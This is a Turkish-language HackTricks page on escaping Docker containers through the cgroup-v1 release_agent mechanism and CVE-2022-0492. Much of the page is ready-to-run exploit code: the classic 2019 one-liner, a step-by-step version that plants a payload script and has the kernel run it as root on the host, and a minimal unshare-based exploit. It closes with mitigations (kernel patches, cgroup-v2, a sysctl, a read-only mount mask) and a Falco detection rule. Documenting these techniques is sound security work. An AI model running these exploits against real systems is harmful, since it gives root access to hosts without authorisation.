# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Daha fazla bilgi için, lütfen** [**orijinal blog yazısına**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)** bakın.** Bu sadece bir özet:

---

## Klasik PoC (2019)
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
PoC, **cgroup-v1** `release_agent` özelliğini kötüye kullanır: `notify_on_release=1` olan bir cgroup'un son görevi çıktığında, çekirdek (host üzerindeki **ilk ad alanlarında**) yazılabilir dosya `release_agent` içinde saklanan programın yolunu çalıştırır. Bu yürütme **host üzerinde tam root ayrıcalıklarıyla** gerçekleştiğinden, dosyaya yazma erişimi elde etmek, bir konteyner kaçışı için yeterlidir.

### Kısa, okunabilir adım adım

1. **Yeni bir cgroup hazırlayın**

```shell
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # veya –o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. **`release_agent`'i saldırgan kontrolündeki script'e yönlendirin**

```shell
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. **Yükü bırakın**

```shell
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
```

4. **Bildirimciyi tetikleyin**

```shell
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # kendimizi ekleyin ve hemen çıkın
cat /output                                  # şimdi host süreçlerini içerir
```

---

## 2022 çekirdek zafiyeti – CVE-2022-0492

Şubat 2022'de Yiqi Sun ve Kevin Wang, **çekirdeğin cgroup-v1'de `release_agent`'e yazan bir süreç için yetenekleri doğrulamadığını** keşfettiler (fonksiyon `cgroup_release_agent_write`).

Etkili bir şekilde, **bir cgroup hiyerarşisini monte edebilen herhangi bir süreç (örneğin `unshare -UrC` aracılığıyla) *ilk* kullanıcı ad alanında `CAP_SYS_ADMIN` olmadan `release_agent`'e rastgele bir yol yazabilirdi**. Varsayılan yapılandırılmış, root çalışan bir Docker/Kubernetes konteynerinde bu, şunlara izin verdi:

* host üzerinde root'a ayrıcalık yükseltme; ↗
* konteynerin ayrıcalıklı olmadan kaçışı.

Hata **CVE-2022-0492** (CVSS 7.8 / Yüksek) olarak atandı ve aşağıdaki çekirdek sürümlerinde (ve tüm sonrakilerde) düzeltildi:

* 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299.

Yaman commit: `1e85af15da28 "cgroup: Fix permission checking"`.

### Konteyner içinde minimal istismar
```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
echo 1 > /tmp/c/notify_on_release;
echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Eğer çekirdek savunmasızsa, *host* üzerindeki busybox ikili dosyası tam root yetkisiyle çalışır.

### Güçlendirme ve Önlemler

* **Çekirdeği güncelleyin** (≥ versiyonlar üstü). Yamanın artık `release_agent`'a yazmak için *ilk* kullanıcı ad alanında `CAP_SYS_ADMIN` gerektirdiği.
* **cgroup-v2'yi tercih edin** – birleşik hiyerarşi **`release_agent` özelliğini tamamen kaldırdı**, bu tür kaçışları ortadan kaldırdı.
* **Gereksiz yetkisiz kullanıcı ad alanlarını devre dışı bırakın**: 
```shell
sysctl -w kernel.unprivileged_userns_clone=0
```
* **Zorunlu erişim kontrolü**: `mount`, `openat` üzerinde `/sys/fs/cgroup/**/release_agent`'ı reddeden AppArmor/SELinux politikaları veya `CAP_SYS_ADMIN`'ı düşüren politikalar, savunmasız çekirdeklerde bile tekniği durdurur.
* **Salt okunur bağlama maskesi** tüm `release_agent` dosyaları için (Palo Alto script örneği):
```shell
for f in $(find /sys/fs/cgroup -name release_agent); do
mount --bind -o ro /dev/null "$f"
done
```

## Çalışma Zamanında Tespit

[`Falco`](https://falco.org/) v0.32'den itibaren yerleşik bir kural ile birlikte gelir:
```yaml
- rule: Detect release_agent File Container Escapes
desc: Detect an attempt to exploit a container escape using release_agent
condition: open_write and container and fd.name endswith release_agent and
(user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
thread.cap_effective contains CAP_SYS_ADMIN
output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
priority: CRITICAL
tags: [container, privilege_escalation]
```
Kural, hala `CAP_SYS_ADMIN` yetkisine sahip bir konteyner içindeki bir süreçten `*/release_agent`'e yapılan herhangi bir yazma girişiminde tetiklenir.

## Referanslar

* [Unit 42 – CVE-2022-0492: cgroups aracılığıyla konteyner kaçışı](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – detaylı analiz ve hafifletme scripti.
* [Sysdig Falco kuralı ve tespit rehberi](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}
